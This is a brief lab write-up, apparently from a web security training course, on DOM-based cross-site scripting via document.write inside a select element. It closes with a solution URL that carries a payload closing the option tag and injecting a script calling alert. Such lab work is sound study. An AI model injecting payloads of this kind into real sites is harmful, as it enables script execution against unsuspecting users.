# Lab: DOM XSS in document.write sink using source location.search inside a select element

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

## Cross Site Scripting
* 解法如前一題
```
payload = https://acfb1fa41f8e98cbc0a5136600a70032.web-security-academy.net/product?productId=3&storeId=123</option><script>alert(1)</script>
```